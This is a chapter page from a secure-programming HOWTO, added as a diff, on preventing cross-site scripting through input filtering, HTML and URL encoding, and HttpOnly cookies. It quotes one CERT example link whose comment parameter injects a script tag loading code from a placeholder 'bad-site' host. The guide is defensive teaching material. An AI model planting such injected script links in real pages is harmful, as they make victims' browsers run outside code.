@@ -1,0 +1,701 @@
+<HTML
+><HEAD
+><TITLE
+>Prevent Cross-Site (XSS) Malicious Content</TITLE
+><META
+NAME="GENERATOR"
+CONTENT="Modular DocBook HTML Stylesheet Version 1.76b+
+"><LINK
+REL="HOME"
+TITLE="Secure Programming for Linux and Unix HOWTO"
+HREF="index.html"><LINK
+REL="UP"
+TITLE="Design Your Program for Security"
+HREF="internals.html"><LINK
+REL="PREVIOUS"
+TITLE="Self-limit Resources"
+HREF="self-limit-resources.html"><LINK
+REL="NEXT"
+TITLE="Foil Semantic Attacks"
+HREF="semantic-attacks.html"></HEAD
+><BODY
+CLASS="SECT1"
+BGCOLOR="#FFFFFF"
+TEXT="#000000"
+LINK="#0000FF"
+VLINK="#840084"
+ALINK="#0000FF"
+><DIV
+CLASS="NAVHEADER"
+><TABLE
+SUMMARY="Header navigation table"
+WIDTH="100%"
+BORDER="0"
+CELLPADDING="0"
+CELLSPACING="0"
+><TR
+><TH
+COLSPAN="3"
+ALIGN="center"
+>Secure Programming for Linux and Unix HOWTO</TH
+></TR
+><TR
+><TD
+WIDTH="10%"
+ALIGN="left"
+VALIGN="bottom"
+><A
+HREF="self-limit-resources.html"
+ACCESSKEY="P"
+>Prev</A
+></TD
+><TD
+WIDTH="80%"
+ALIGN="center"
+VALIGN="bottom"
+>Chapter 7. Design Your Program for Security</TD
+><TD
+WIDTH="10%"
+ALIGN="right"
+VALIGN="bottom"
+><A
+HREF="semantic-attacks.html"
+ACCESSKEY="N"
+>Next</A
+></TD
+></TR
+></TABLE
+><HR
+ALIGN="LEFT"
+WIDTH="100%"></DIV
+><DIV
+CLASS="SECT1"
+><H1
+CLASS="SECT1"
+><A
+NAME="CROSS-SITE-MALICIOUS-CONTENT"
+></A
+>7.16. Prevent Cross-Site (XSS) Malicious Content</H1
+><P
+>Some secure programs accept data from one untrusted user (the attacker)
+and pass that data on to a different user's application (the victim).
+If the secure program doesn't protect the victim, the
+victim's application (e.g., their web browser)
+may then process that data in a way harmful to the victim.
+This is a particularly common problem for web applications using HTML or XML,
+where the problem goes by several names including ``cross-site scripting'',
+``malicious HTML tags'', and ``malicious content.''
+This book will call this problem ``cross-site malicious content,''
+since the problem isn't limited to scripts or HTML, and its cross-site nature
+is fundamental.
+Note that this problem isn't limited to web applications, but since
+this is a particular problem for them, the rest of this discussion
+will emphasize web applications.
+As will be shown in a moment, sometimes an attacker can cause a victim
+to send data from the victim to the secure program, so the secure program
+must protect the victim from himself.</P
+><DIV
+CLASS="SECT2"
+><H2
+CLASS="SECT2"
+><A
+NAME="EXPLAIN-CROSS-SITE"
+></A
+>7.16.1. Explanation of the Problem</H2
+><P
+>Let's begin with a simple example.
+Some web applications are designed to
+permit HTML tags in data input from users that will later
+be posted to other readers (e.g., in a guestbook or ``reader comment'' area).
+If nothing is done to prevent it,
+these tags can be used by malicious users to attack other users by inserting
+scripts,
+Java references (including references to hostile applets), DHTML tags,
+early document endings (via &#60;/HTML&#62;), absurd font size requests,
+and so on.
+This capability can be exploited for a wide range of effects,
+such as exposing SSL-encrypted connections, accessing restricted web
+sites via the client, violating domain-based security policies,
+making the web page unreadable,
+making the web page unpleasant to use (e.g., via annoying banners
+and offensive material),
+permit privacy intrusions (e.g., by inserting a web bug to learn exactly
+who reads a certain page),
+creating
+denial-of-service attacks (e.g., by creating an ``infinite'' number
+of windows), and even very destructive attacks (by inserting
+attacks on security vulnerabilities such as scripting languages or
+buffer overflows in browsers).
+By embedding malicious FORM tags at the right place, an intruder
+may even be able to trick users into revealing sensitive information
+(by modifying the behavior of an existing form).
+Or, by embedding scripts, an intruder can cause no end of problems.
+This is by no means an exhaustive list of problems, but
+hopefully this is enough to convince you that this is a serious problem.</P
+><P
+>Most ``discussion boards'' have already discovered this problem,
+and most already take steps to prevent it in text intended to be part of
+a multiperson discussion.
+Unfortunately, many web application developers don't
+realize that this is a much more general problem.
+<EM
+>Every</EM
+> data value that is sent from one
+user to another can potentially be a source for cross-site
+malicious posting, even if it's not an ``obvious'' case of an area
+where arbitrary HTML is expected.
+The malicious data can even be supplied by the user himself, since the
+user may have been fooled into supplying the data via another site.
+Here's an example (from CERT) of an HTML link that causes the user to
+send malicious data to another site:
+<TABLE
+BORDER="0"
+BGCOLOR="#E0E0E0"
+WIDTH="100%"
+><TR
+><TD
+><FONT
+COLOR="#000000"
+><PRE
+CLASS="PROGRAMLISTING"
+> &#60;A HREF="http://example.com/comment.cgi?mycomment=&#60;SCRIPT
+ SRC='http://bad-site/badfile'&#62;&#60;/SCRIPT&#62;"&#62; Click here&#60;/A&#62;</PRE
+></FONT
+></TD
+></TR
+></TABLE
+></P
+><P
+>In short, a web application cannot accept input (including any form data)
+without checking, filtering, or encoding it.
+You can't even pass that data back to the same user in many cases
+in web applications, since another user may have surreptitiously
+supplied the data.
+Even if permitting such material won't hurt your system, it will
+enable your system to be a conduit of attacks to your users.
+Even worse, those attacks will appear to be coming from your system.</P
+><P
+>CERT describes the problem this way in their advisory:
+<A
+NAME="AEN1519"
+></A
+><BLOCKQUOTE
+CLASS="BLOCKQUOTE"
+><P
+>A web site may inadvertently include malicious HTML tags or script
+in a dynamically generated page based on unvalidated input
+from untrustworthy sources
+(<A
+HREF="http://www.cert.org/advisories/CA-2000-02.html"
+TARGET="_top"
+>CERT Advisory
+CA-2000-02, Malicious HTML Tags Embedded in Client Web Requests</A
+>).</P
+></BLOCKQUOTE
+>
+More information from CERT about this is available at
+<A
+HREF="http://www.cert.org/archive/pdf/cross_site_scripting.pdf"
+TARGET="_top"
+>http://www.cert.org/archive/pdf/cross_site_scripting.pdf</A
+>.
+The paper
+<A
+HREF="http://www.net-security.org/dl/articles/xss_anatomy.pdf"
+TARGET="_top"
+>The Anatomy of Cross Site Scripting</A
+>
+discusses some of XSS's ramifications.</P
+></DIV
+><DIV
+CLASS="SECT2"
+><H2
+CLASS="SECT2"
+><A
+NAME="SOLUTIONS-CROSS-SITE"
+></A
+>7.16.2. Solutions to Cross-Site Malicious Content</H2
+><P
+>Fundamentally, this means that all web application output impacted
+by any user must be
+filtered (so characters that can cause this problem are removed),
+encoded (so the characters that can cause this problem are encoded in
+a way to prevent the problem), or
+validated (to ensure that only ``safe'' data gets through).
+This includes all output derived from
+input such as URL parameters, form data, cookies,
+database queries, CORBA ORB results, and data from users stored in files.
+In many cases,
+filtering and validation should be done at the input, but
+encoding can be done during either input validation or output generation.
+If you're just passing the data through without analysis, it's probably
+better to encode the data on input (so it won't be forgotten).
+However, if your program processes the data,
+it can be easier to encode it on output instead.
+CERT recommends that filtering and encoding be done during data output;
+this isn't a bad idea, but there are many cases where it makes sense to do it
+at input instead.
+The critical issue is to make sure that you cover all cases for
+every output, which is not an easy thing to do regardless of approach.</P
+><P
+>Warning - in many cases these techniques can be subverted unless you've also
+gained control over the character encoding of the output.
+Otherwise, an attacker could use an ``unexpected'' character encoding
+to subvert the techniques discussed here.
+Thankfully, this isn't hard;
+gaining control over output character encoding is discussed in
+<A
+HREF="output-character-encoding.html"
+>Section 9.5</A
+>.</P
+><P
+>One minor defense, that's often worth doing, is the "HttpOnly" flag for
+cookies.
+Scripts that run in a web browser cannot access cookie values
+that have the HttpOnly flag set (they just get an empty value instead).
+This is currently implemented in
+Microsoft Internet Explorer, and I expect
+Mozilla/Netscape to implement this soon too.
+You should set HttpOnly on for any cookie you send, unless you have
+scripts that need the cookie, to counter certain kinds of cross-site
+scripting (XSS) attacks.
+However, the HttpOnly flag can be circumvented in a variety of ways,
+so using as your primary defense is inappropriate.
+Instead, it's a helpful secondary defense that may help save you in
+case your application is written incorrectly.</P
+><P
+>The first subsection below discusses how to identify special
+characters that need to be filtered, encoded, or validated.
+This is followed by subsections describing
+how to filter or encode these characters.
+There's no subsection discussing how to validate data in general,
+however, for input validation in general see <A
+HREF="input.html"
+>Chapter 5</A
+>,
+and if the input is straight HTML text or a URI, see
+<A
+HREF="filter-html.html"
+>Section 5.11</A
+>.
+Also note that your web application can receive malicious cross-postings,
+so non-queries should forbid the GET protocol
+(see <A
+HREF="avoid-get-non-queries.html"
+>Section 5.12</A
+>).</P
+><DIV
+CLASS="SECT3"
+><H3
+CLASS="SECT3"
+><A
+NAME="AEN1534"
+></A
+>7.16.2.1. Identifying Special Characters</H3
+><P
+>Here are the special characters for a variety of circumstances
+(my thanks to the CERT, who developed this list):
+
+<P
+></P
+><UL
+><LI
+><P
+>In the content of a block-level element (e.g.,
+in the middle of a paragraph of text in HTML or a block in XML):
+ <P
+></P
+><UL
+><LI
+><P
+>"&#60;" is special because it introduces a tag.</P
+></LI
+><LI
+><P
+>"&#38;" is special because it introduces a character entity.</P
+></LI
+><LI
+><P
+>"&#62;" is special because some browsers treat it as special,
+on the assumption that the author of the page really meant
+to put in an opening "&#60;", but omitted it in error.</P
+></LI
+></UL
+></P
+></LI
+><LI
+><P
+>In attribute values:
+<P
+></P
+><UL
+><LI
+><P
+>In attribute values enclosed with double quotes, the
+double quotes are special because they mark the end of the attribute value.</P
+></LI
+><LI
+><P
+>In attribute values enclosed with single quote, the single
+quotes are special because they mark the end of the attribute value.
+XML's definition allows single quotes, but I've been told that some
+XML parsers don't handle them correctly, so you might avoid
+using single quotes in XML.</P
+></LI
+><LI
+><P
+>Attribute values without any quotes make the white-space
+characters such as space and tab special. 
+Note that these aren't legal in XML either, <EM
+>and</EM
+>
+they make more characters special.
+Thus, I recommend against unquoted attributes if you're using
+dynamically generated values in them.</P
+></LI
+><LI
+><P
+>"&#38;" is special when used in conjunction with
+some attributes because it introduces a character entity.</P
+></LI
+></UL
+></P
+></LI
+><LI
+><P
+>In URLs, for example, a search engine might provide a link within
+the results page that the user can click to re-run the search. This
+can be implemented by encoding the search query inside the URL. When
+this is done, it introduces additional special characters:
+<P
+></P
+><UL
+><LI
+><P
+>Space, tab, and new line are special because they mark the
+end of the URL.</P
+></LI
+><LI
+><P
+>        "&#38;" is special because it introduces a character
+        entity or separates CGI parameters.</P
+></LI
+><LI
+><P
+>        Non-ASCII characters (that is, everything above 128 in the
+        ISO-8859-1 encoding) aren't allowed in URLs, so they are all
+        special here.</P
+></LI
+><LI
+><P
+>        The "%" must be filtered from input anywhere parameters
+        encoded with HTTP escape sequences are decoded by server-side
+        code. The percent must be filtered if input such as
+        "%68%65%6C%6C%6F" becomes "hello" when it appears on the web
+        page in question.</P
+></LI
+></UL
+></P
+></LI
+><LI
+><P
+>Within the body of a &#60;SCRIPT&#62; &#60;/SCRIPT&#62;
+        the semicolon, parenthesis, curly braces, and new line
+        should be filtered in situations where text could be inserted
+        directly into a preexisting script tag.</P
+></LI
+><LI
+><P
+>        Server-side scripts that convert any exclamation
+        characters (!) in input to double-quote characters (") on
+        output might require additional filtering.</P
+></LI
+></UL
+></P
+><P
+>Note that, in general, the ampersand (&#38;) is special in HTML and XML.</P
+></DIV
+><DIV
+CLASS="SECT3"
+><H3
+CLASS="SECT3"
+><A
+NAME="AEN1575"
+></A
+>7.16.2.2. Filtering</H3
+><P
+>One approach to handling these special characters is simply
+eliminating them (usually during input or output).</P
+><P
+>If you're already validating your input for valid characters
+(and you generally should), this is easily done by simply omitting the
+special characters from the list of valid characters.
+Here's an example in Perl of a filter that only accepts legal
+characters, and since the filter doesn't accept any special characters
+other than the space, it's quite acceptable for use in areas such as
+a quoted attribute:
+<TABLE
+BORDER="0"
+BGCOLOR="#E0E0E0"
+WIDTH="100%"
+><TR
+><TD
+><FONT
+COLOR="#000000"
+><PRE
+CLASS="PROGRAMLISTING"
+> # Accept only legal characters:
+ $summary =~ tr/A-Za-z0-9\ \.\://dc;</PRE
+></FONT
+></TD
+></TR
+></TABLE
+></P
+><P
+>However, if you really want to strip away <EM
+>only</EM
+>
+the smallest number of characters, then you could create a subroutine
+to remove just those characters:
+<TABLE
+BORDER="0"
+BGCOLOR="#E0E0E0"
+WIDTH="100%"
+><TR
+><TD
+><FONT
+COLOR="#000000"
+><PRE
+CLASS="PROGRAMLISTING"
+> sub remove_special_chars {
+  local($s) = @_;
+  $s =~ s/[\&#60;\&#62;\"\'\%\;\(\)\&#38;\+]//g;
+  return $s;
+ }
+ # Sample use:
+ $data = &#38;remove_special_chars($data);</PRE
+></FONT
+></TD
+></TR
+></TABLE
+></P
+></DIV
+><DIV
+CLASS="SECT3"
+><H3
+CLASS="SECT3"
+><A
+NAME="AEN1583"
+></A
+>7.16.2.3. Encoding (Quoting)</H3
+><P
+>An alternative to removing the special characters is to encode them
+so that they don't have any special meaning.
+This has several advantages over filtering the characters,
+in particular, it prevents data loss.
+If the data is "mangled" by the process from the user's point of view,
+at least when the data is encoded it's possible to reconstruct the
+data that was originally sent.</P
+><P
+>HTML, XML, and SGML all use the ampersand ("&#38;") character as a
+way to introduce encodings in the running text; this encoding
+is often called ``HTML encoding.''
+To encode these characters, simply transform the special characters
+in your circumstance. Usually this means
+'&#60;' becomes '&#38;lt;',
+'&#62;' becomes '&#38;gt;',
+'&#38;' becomes '&#38;amp;', and
+'"' becomes '&#38;quot;'.
+As noted above, although in theory '&#62;' doesn't need to be quoted,
+because some browsers act on it (and fill in a '&#60;') it needs to be quoted.
+There's a minor complexity with the double-quote character,
+because '&#38;quot;' only needs to be
+used inside attributes, and some extremely old browsers don't
+properly render it.
+If you can handle the additional complexity, you can try to encode '"'
+only when you need to, but it's easier to simply encode it and ask
+users to upgrade their browsers.
+Few users will use such ancient browsers, and the double-quote character
+encoding has been a standard for a long time.</P
+><P
+>Scripting languages may consider implementing specialized auto-quoting types,
+the interesting approach developed in the web application framework
+<A
+HREF="http://www.mems-exchange.org/software/quixote"
+TARGET="_top"
+>Quixote</A
+>.
+Quixote includes a "template" feature which allows easy mixing of HTML text
+and Python code; text generated by a template is passed back to the web browser
+as an HTML document.
+As of version 0.6, Quixote has two kinds of text (instead of a single
+kind as most such languages).
+Anything which appears in a literal, quoted string is of type "htmltext,"
+and it is assumed to be exactly as the programmer wanted it to be
+(this is reasoble, since the programmer wrote it).
+Anything which takes the form of an ordinary Python string, however,
+is automatically quoted as the template is executed.
+As a result, text from a database or other external source is
+automatically quoted, and cannot be used for a cross-site scripting attack.
+Thus, Quixote implements a safe default -
+programmers no longer need to worry about quoting every bit of text
+that passes through the application (bugs involving too much quoting
+are less likely to be a security problem, and will be obvious in testing).
+Quixote uses an open source software license, but because of its
+venue identification it is probably GPL-incompatible, and is used by
+organizations such as the
+<A
+HREF="http://lwn.net"
+TARGET="_top"
+>Linux Weekly News</A
+>.</P
+><P
+>This approach to HTML encoding
+isn't quite enough encoding in some circumstances.
+As discussed in <A
+HREF="output-character-encoding.html"
+>Section 9.5</A
+>,
+you need to specify the output character encoding (the ``charset'').
+If some of your data is encoded using a different character encoding
+than the output character encoding, then you'll need to do something so your
+output uses a consistent and correct encoding.
+Also, you've selected an output encoding other than
+ISO-8859-1, then you need to
+make sure that any alternative encodings for special characters
+(such as "&#60;") can't slip through to the browser.
+This is a problem with several character encodings, including popular ones
+like UTF-7 and UTF-8; see <A
+HREF="character-encoding.html"
+>Section 5.9</A
+>
+for more information on how to prevent ``alternative'' encodings of characters.
+One way to deal with incompatible character encodings is to
+first translate the characters internally to ISO 10646 (which has
+the same character values as Unicode), and then
+using either numeric character references or character entity
+references to represent them:
+<P
+></P
+><UL
+><LI
+><P
+>A numeric character reference looks like
+"&#38;#D;", where D is a decimal number, or
+"&#38;#xH;" or "&#38;#XH;", where H is a hexadecimal number.
+The number given is the ISO 10646 character id (which has the same character
+values as Unicode).
+Thus &#38;#1048; is the Cyrillic capital letter "I".
+The hexadecimal system isn't supported in the SGML standard (ISO 8879),
+so I'd suggest using the decimal system for output.
+Also, although SGML specification
+permits the trailing semicolon to be omitted in
+some circumstances, in practice many systems don't handle it - so
+always include the trailing semicolon.</P
+></LI
+><LI
+><P
+>A character entity reference does the same thing but
+uses mnemonic names instead of numbers.
+For example, "&#38;lt;" represents the &#60; sign.
+If you're generating HTML, see the
+<A
+HREF="http://www.w3.org"
+TARGET="_top"
+>HTML specification</A
+> which
+lists all mnemonic names.</P
+></LI
+></UL
+>
+Either system (numeric or character entity)
+works; I suggest using character entity references for
+'&#60;', '&#62;', '&#38;', and '"' because it makes your code (and output)
+easier for humans to understand.  Other than that, it's not clear
+that one or the other system is uniformly better.
+If you expect humans to edit the output by hand later, use the
+character entity references where you can, otherwise I'd use the
+decimal numeric character references just because they're easier to program.
+This encoding scheme can be quite inefficient for some languages
+(especially Asian languages); if that is your primary content, you
+might choose to use a different character encoding (charset), filter
+on the critical characters (e.g., "&#60;")
+and ensure that no alternative encodings for critical characters are allowed.</P
+><P
+>URIs have their own encoding scheme, commonly called ``URL encoding.''
+In this system, characters not permitted in URLs are represented using
+a percent sign followed by its two-digit hexadecimal value.
+To handle all of ISO 10646 (Unicode), it's recommended to first translate
+the codes to UTF-8, and then encode it.
+See <A
+HREF="filter-html.html#VALIDATING-URIS"
+>Section 5.11.4</A
+> for more about validating URIs.</P
+></DIV
+></DIV
+></DIV
+><DIV
+CLASS="NAVFOOTER"
+><HR
+ALIGN="LEFT"
+WIDTH="100%"><TABLE
+SUMMARY="Footer navigation table"
+WIDTH="100%"
+BORDER="0"
+CELLPADDING="0"
+CELLSPACING="0"
+><TR
+><TD
+WIDTH="33%"
+ALIGN="left"
+VALIGN="top"
+><A
+HREF="self-limit-resources.html"
+ACCESSKEY="P"
+>Prev</A
+></TD
+><TD
+WIDTH="34%"
+ALIGN="center"
+VALIGN="top"
+><A
+HREF="index.html"
+ACCESSKEY="H"
+>Home</A
+></TD
+><TD
+WIDTH="33%"
+ALIGN="right"
+VALIGN="top"
+><A
+HREF="semantic-attacks.html"
+ACCESSKEY="N"
+>Next</A
+></TD
+></TR
+><TR
+><TD
+WIDTH="33%"
+ALIGN="left"
+VALIGN="top"
+>Self-limit Resources</TD
+><TD
+WIDTH="34%"
+ALIGN="center"
+VALIGN="top"
+><A
+HREF="internals.html"
+ACCESSKEY="U"
+>Up</A
+></TD
+><TD
+WIDTH="33%"
+ALIGN="right"
+VALIGN="top"
+>Foil Semantic Attacks</TD
+></TR
+></TABLE
+></DIV
+></BODY
+></HTML
+>
